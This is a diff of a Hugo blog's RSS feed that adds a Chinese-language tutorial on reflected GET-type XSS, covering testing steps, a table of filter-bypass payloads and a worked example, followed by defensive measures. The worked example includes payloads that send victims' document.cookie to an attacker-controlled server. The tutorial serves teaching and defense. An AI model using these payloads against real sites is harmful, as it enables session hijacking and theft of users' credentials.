@@ -7,7 +7,166 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Loyal</copyright>
-        <lastBuildDate>Mon, 16 Mar 2026 15:55:12 +0800</lastBuildDate><atom:link href="https://lloyal-sudo.github.io/lloyal-sudo01/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 16 Mar 2026 16:48:28 +0800</lastBuildDate><atom:link href="https://lloyal-sudo.github.io/lloyal-sudo01/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>反射型 XSS（GET 型）详解 &#43; 实战解题步骤</title>
+        <link>https://lloyal-sudo.github.io/lloyal-sudo01/p/%E5%8F%8D%E5%B0%84%E5%9E%8B-xssget-%E5%9E%8B%E8%AF%A6%E8%A7%A3--%E5%AE%9E%E6%88%98%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4/</link>
+        <pubDate>Mon, 16 Mar 2026 16:48:28 +0800</pubDate>
+        
+        <guid>https://lloyal-sudo.github.io/lloyal-sudo01/p/%E5%8F%8D%E5%B0%84%E5%9E%8B-xssget-%E5%9E%8B%E8%AF%A6%E8%A7%A3--%E5%AE%9E%E6%88%98%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4/</guid>
+        <description>&lt;h2 id=&#34;一反射型-xssget-型核心介绍&#34;&gt;一、反射型 XSS（GET 型）核心介绍
+&lt;/h2&gt;&lt;h3 id=&#34;1-定义&#34;&gt;1. 定义
+&lt;/h3&gt;&lt;p&gt;攻击者将恶意 JS 代码拼接在 &lt;strong&gt;GET 请求的 URL 参数&lt;/strong&gt; 中，诱导受害者点击该链接；服务器接收到参数后，未做过滤/转义就直接将参数内容反射（输出）到页面中，浏览器执行这段恶意代码，完成攻击。&lt;/p&gt;
+&lt;h3 id=&#34;2-核心特征&#34;&gt;2. 核心特征
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;非持久化&lt;/strong&gt;：恶意代码只存在于 URL 中，不会存入数据库，只有点击特定链接的用户才会中招；&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;依赖 GET 传参&lt;/strong&gt;：参数通过 URL 传递（如 &lt;code&gt;?name=xxx&lt;/code&gt;），可直接看到；&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;触发简单&lt;/strong&gt;：通常是“输入→输出”一次完成，比如搜索框输入内容后，页面直接显示搜索关键词，若未过滤就会触发。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-典型场景&#34;&gt;3. 典型场景
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;网站搜索功能（&lt;code&gt;/search?keyword=xxx&lt;/code&gt;）；&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;错误提示页面（&lt;code&gt;/error?msg=xxx&lt;/code&gt;）；&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;个人资料预览（&lt;code&gt;/profile?nickname=xxx&lt;/code&gt;）；&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;URL 参数直接回显的页面（&lt;code&gt;/welcome?name=xxx&lt;/code&gt;）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;4-危害&#34;&gt;4. 危害
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;偷取用户 Cookie（结合 &lt;code&gt;document.cookie&lt;/code&gt;）；&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;劫持用户会话，冒充用户操作；&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;跳转到钓鱼网站；&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;诱导用户点击恶意按钮/链接。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;二反射型-xssget-型解题挖掘步骤&#34;&gt;二、反射型 XSS（GET 型）解题/挖掘步骤
+&lt;/h2&gt;&lt;h3 id=&#34;核心思路&#34;&gt;核心思路
+&lt;/h3&gt;&lt;p&gt;找到&lt;strong&gt;URL 参数能直接回显到页面&lt;/strong&gt;的位置 → 测试参数是否过滤 → 构造绕过/注入代码 → 验证是否执行。&lt;/p&gt;
+&lt;h3 id=&#34;详细步骤实战通用&#34;&gt;详细步骤（实战通用）
+&lt;/h3&gt;&lt;h4 id=&#34;步骤-1找到可测试的-get-参数&#34;&gt;步骤 1：找到可测试的 GET 参数
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;先访问目标页面，找到带 GET 参数的 URL，比如：&lt;br&gt;
+&lt;code&gt;http://test.com/search?keyword=test&lt;/code&gt;&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;观察页面中是否显示了参数值（比如页面显示“你搜索的关键词：test”），这个&lt;strong&gt;回显点&lt;/strong&gt;就是测试目标。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;步骤-2初步测试是否存在-xss-漏洞&#34;&gt;步骤 2：初步测试是否存在 XSS 漏洞
+&lt;/h4&gt;&lt;p&gt;向参数中输入简单的测试代码，看是否会被执行/解析：&lt;br&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# 测试 URL（替换成目标地址）
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://test.com/search?keyword=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;如果页面弹出 &lt;code&gt;1&lt;/code&gt; → 直接存在 XSS 漏洞；&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;如果没弹出 → 说明有过滤，进入下一步“绕过测试”。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;步骤-3过滤规则绕过最核心的解题环节&#34;&gt;步骤 3：过滤规则绕过（最核心的解题环节）
+&lt;/h4&gt;&lt;p&gt;服务器通常会过滤 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;、&lt;code&gt;alert&lt;/code&gt; 等关键词，需要针对性绕过，常见场景如下：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;过滤规则&lt;/th&gt;
+&lt;th&gt;绕过方法（示例）&lt;/th&gt;
+&lt;th&gt;原理&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;过滤 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 标签&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;用其他可执行 JS 的标签&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;过滤 &lt;code&gt;alert&lt;/code&gt; 关键词&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;alert&lt;/code&gt; → &lt;code&gt;confirm&lt;/code&gt;/&lt;code&gt;prompt&lt;/code&gt;/&lt;code&gt;a\u006cert&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;替换函数/Unicode 编码&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;过滤括号 &lt;code&gt;()&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;alert&amp;amp;#40;1&amp;amp;#41;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;HTML 实体编码&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;过滤空格&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;img/src=x/onerror=alert(1)&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;用 &lt;code&gt;/&lt;/code&gt; 代替空格&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;只过滤小写标签&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;SCRIPT&amp;gt;alert(1)&amp;lt;/SCRIPT&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;大小写混合（部分场景）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4 id=&#34;步骤-4验证漏洞是否生效&#34;&gt;步骤 4：验证漏洞是否生效
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;若能弹出 &lt;code&gt;alert(1)&lt;/code&gt;（或 &lt;code&gt;confirm(1)&lt;/code&gt;）→ 漏洞验证成功；&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;若需要实战利用（如偷 Cookie），替换代码为：&lt;br&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://你的服务器/steal?cookie=&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/script&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;（需自己搭建一个简单的服务器接收 Cookie）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;步骤-5优化攻击代码可选&#34;&gt;步骤 5：优化攻击代码（可选）
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;缩短代码长度（方便传播）：&lt;code&gt;&amp;quot;&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&lt;/code&gt;；&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;规避前端过滤：用 Base64 编码、JS 混淆等。&lt;br&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;三实战例子&#34;&gt;三、实战例子
+&lt;/h2&gt;&lt;h3 id=&#34;场景&#34;&gt;场景
+&lt;/h3&gt;&lt;p&gt;目标网站：&lt;code&gt;http://test.com/welcome?name=访客&lt;/code&gt;，页面显示“欢迎你：访客”。&lt;/p&gt;
+&lt;h3 id=&#34;解题步骤&#34;&gt;解题步骤
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;测试基础代码&lt;/strong&gt;：&lt;br&gt;
+访问 &lt;code&gt;http://test.com/welcome?name=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;，发现页面没弹窗，且源码中 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 被过滤成了 &lt;code&gt;&amp;amp;lt;script&amp;amp;gt;&lt;/code&gt;（HTML 转义）。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;尝试标签绕过&lt;/strong&gt;：&lt;br&gt;
+换用 &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; 标签：&lt;code&gt;http://test.com/welcome?name=&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/code&gt;，页面弹出 &lt;code&gt;1&lt;/code&gt; → 漏洞存在。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;实战利用（偷 Cookie）&lt;/strong&gt;：&lt;br&gt;
+构造最终链接：&lt;br&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://test.com/welcome?name=&amp;lt;img src=x onerror=&amp;#34;document.location=&amp;#39;http://my-server.com?cookie=&amp;#39;+document.cookie&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;受害者点击后，其 Cookie 会被发送到你的服务器。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;四防御反射型-xssget-型的核心方法&#34;&gt;四、防御反射型 XSS（GET 型）的核心方法
+&lt;/h2&gt;&lt;p&gt;（解题的同时也要知道怎么防）&lt;br&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;输出转义&lt;/strong&gt;：服务器将参数输出到页面时，对特殊字符（&lt;code&gt;&amp;lt;&lt;/code&gt;/&lt;code&gt;&amp;gt;&lt;/code&gt;/&lt;code&gt;&amp;quot;&lt;/code&gt;/&lt;code&gt;&#39;&lt;/code&gt;/&lt;code&gt;&amp;amp;&lt;/code&gt;）做 HTML 转义；&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;输入过滤&lt;/strong&gt;：对 GET 参数做白名单校验（只允许合法字符，如字母、数字）；&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;CSP 策略&lt;/strong&gt;：禁止内联脚本执行，限制 JS 加载来源；&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Cookie HttpOnly&lt;/strong&gt;：即使存在 XSS，也无法偷取 Cookie。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;总结&#34;&gt;总结
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;反射型 XSS（GET 型）核心是&lt;strong&gt;URL 参数回显未过滤&lt;/strong&gt;，恶意代码随 URL 传递、一次性执行；&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;解题步骤：找回显参数 → 基础测试 → 绕过过滤 → 验证/利用；&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;常见绕过技巧：替换标签（&lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt;/&lt;code&gt;&amp;lt;svg&amp;gt;&lt;/code&gt;）、编码、大小写混合、替换危险函数。&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        <item>
         <title>Cross-Site Scripting（XSS）详解</title>
         <link>https://lloyal-sudo.github.io/lloyal-sudo01/p/cross-site-scriptingxss%E8%AF%A6%E8%A7%A3/</link>
         <pubDate>Mon, 16 Mar 2026 15:55:12 +0800</pubDate>
